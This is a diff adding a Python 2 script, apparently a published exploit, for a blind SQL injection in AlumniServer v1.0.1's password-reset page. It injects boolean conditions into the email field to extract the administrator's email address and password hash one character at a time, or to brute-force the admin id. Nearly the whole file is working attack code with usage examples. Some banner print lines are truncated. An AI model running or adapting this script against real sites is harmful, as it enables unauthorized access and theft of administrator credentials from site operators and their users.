@@ -1,0 +1,153 @@
+def init():
+	if(sys.platform=='win32'):
+		os.system("cls")
+		os.system ("title AlumniServer v-1.0.1 Blind SQL Injection Exploit")
+		os.system ("color 02")
+	else:
+		os.system("clear")
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	print "\t
+	
+def request(urltarget,postmsg):
+	req=urllib2.Request(url=urltarget,data=postmsg)
+	conn = urllib2.urlopen(req)
+	outcode=conn.read()
+	return outcode
+def error():
+	print "\t------------------------------------------------------------\n"
+	print "\tWeb isn't vulnerable!\n\n"
+	print "\t--->Maybe:\n\n"
+	print "\t\t1.-Patched.\n"
+	print "\t\t2.-Bad path or host.\n"
+	print "\t\t3.-Bad mail.\n"
+	print "\t\t4.-Magic quotes ON.\n"
+	print "\t\tEXPLOIT FAILED!\n"
+	print "\t------------------------------------------------------------\n"
+	sys.exit()
+def testedblindsql():
+	print "\t-----------------------------------------------------------------\n"
+	print "\tWEB MAYBE BE VULNERABLE!\n\n"
+	print "\tTested Blind SQL Injection.\n"		
+	print "\tStarting exploit...\n"
+	print "\t-----------------------------------------------------------------\n\n"
+def helper(filename):
+	print "\n\t[!!!] AlumniServer v-1.0.1 Blind SQL Injection Exploit\n"
+	print "\t[!!!] USAGE MODE: [!!!]\n"
+	print "\t[!!!] python "+filename+" [HOST] [PATH] [MAIL] [ID_ADMIN/HIDDEN/BRUTEFORCEID]\n"
+	print "\t[!!!] [HOST]: Web.\n"
+	print "\t[!!!] [PATH]: Home Path.\n"
+	print "\t[!!!] [MAIL]: Mail for fish\n"
+	print "\t[!!!] [ID_ADMIN/HIDDEN/BRUTEFORCEID]: Id_admin if we are registered users or 'hidden' value if admin is hidden.\n"
+	print "\t[!!!]  Also can use 'bruteforceid' value for bruteforce admin id previously.\n"
+	print "\t[!!!] Example: python "+filename+" www.example.com demo y3nh4ck3r@gmail.com cd54cd7df99a\n"
+	print "\t[!!!] Example: python "+filename+" www.example.com demo y3nh4ck3r@gmail.com hidden\n"
+	print "\t[!!!] Example: python "+filename+" www.example.com demo y3nh4ck3r@gmail.com bruteforceid\n"
+	sys.exit()
+	
+def brute_length(urlrequest, idadmin, mail):
+	flag=1
+	i=0
+	while(flag==1):
+		i=i+1
+		if(idadmin=="hidden"):
+			blindsql="resetpwemail="+mail+"'+AND+(SELECT+length(email)+FROM+as_users+WHERE+hideuser='y')='"+str(i)
+		else:
+			blindsql="resetpwemail="+mail+"'+AND+(SELECT+length(email)+FROM+as_users+WHERE+id='"+idadmin+"')='"+str(i)
+		output=request(urlrequest, blindsql)
+		if(re.search("You will receive an email shortly with a link that enables you to reset your password.",output)):
+			flag=2
+		else:
+			flag=1
+		if (i>50):
+			error()
+	length=i
+	print "\t<<<<<--------------------------------------------------------->>>>>\n"
+	print "\tLength catched!\n"
+	print "\tLength E-mail --> "+str(length)+"\n"
+	print "\tWait several minutes...\n"
+	print "\t<<<<<--------------------------------------------------------->>>>>\n\n"
+	return length
+def exploiting (lengthvalue, urlrequest, column, idadmin, mail):
+	values=""
+	k=1
+	z=32
+	while((k<=lengthvalue) and (z<=126)):
+		if(idadmin=="hidden"):
+			blindsql="resetpwemail="+mail+"'+AND+ascii(substring((SELECT+"+column+"+FROM+as_users+WHERE+hideuser='y'),"+str(k)+",1))='"+str(z)
+		else:
+			blindsql="resetpwemail="+mail+"'+AND+ascii(substring((SELECT+"+column+"+FROM+as_users+WHERE+id='"+idadmin+"'),"+str(k)+",1))='"+str(z)
+		output=request(urlrequest, blindsql)
+		if(re.search("You will receive an email shortly with a link that enables you to reset your password.",output)):
+			values=values+chr(z)
+			k=k+1
+			z=32
+		z=z+1 
+	return values
+	
+def exploiting_id (urlrequest, mail):
+	values=""
+	arrayids=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']
+	k=1
+	while(k<=12):
+		for z in arrayids:	
+			blindsql="resetpwemail="+mail+"'+AND+substring((SELECT+id+FROM+as_users+HAVING+MIN(membersince)),"+str(k)+",1)='"+str(z)
+			output=request(urlrequest, blindsql)
+			if(re.search("You will receive an email shortly with a link that enables you to reset your password.",output)):
+				values=values+str(z)
+				k=k+1
+				z='g'		
+	return values
+init()
+if(len(sys.argv) <= 4):
+	helper(sys.argv[0])
+host=sys.argv[1]
+path=sys.argv[2]
+mail=sys.argv[3]
+if(sys.argv[4]=="hidden"):
+	mode="hidden"
+elif(sys.argv[4]=="bruteforceid"):
+	mode="bruteforceid"
+else:
+	mode="usual"
+	idadmin=sys.argv[4]
+finalrequest="http://"+host+"/"+path+"/Password.php"
+testblind1="resetpwemail="+mail+"%27+and+1%3D%271"
+outcode1=request(finalrequest,testblind1)
+testblind2="resetpwemail="+mail+"%27+and+1%3D%270"
+outcode2=request(finalrequest,testblind2)
+if(outcode1==outcode2):
+	error()
+else:
+	testedblindsql()
+if(mode=="usual"):
+	lengthadmin=brute_length(finalrequest, idadmin, mail)
+	mailadmin=exploiting(lengthadmin, finalrequest, "email", idadmin, mail)
+	passwordhash=exploiting(32, finalrequest, "password", idadmin, mail)
+elif(mode=="hidden"):
+	lengthadmin=brute_length(finalrequest, "hidden", mail)
+	mailadmin=exploiting(lengthadmin, finalrequest, "email", "hidden", mail)
+	passwordhash=exploiting(32, finalrequest, "password", "hidden", mail)
+else:
+	print "\t<<<<<--------------------------------------------------------->>>>>\n"
+	print "\tBruteforcing id. Wait a few minutes...\n"
+	print "\t<<<<<--------------------------------------------------------->>>>>\n\n"
+	idadmin=exploiting_id(finalrequest, mail)
+print "\n\t\t*************************************************\n"
+print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n"
+print "\t\t*************************************************\n\n"
+if((mode=="usual") or (mode=="hidden")):
+	print "\t\tAdmin-mail: "+mailadmin+"\n\n"
+	print "\t\tPassword hash: "+passwordhash+"\n\n"
+else:
+	print "\t\tAdmin-id: "+idadmin+"\n\n"
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n"
+print "\t\t<<---------------Thanks to: y3nh4ck3r-------------->>\n\n"
+print "\t\t<<------------------------EOF---------------------->>\n\n"
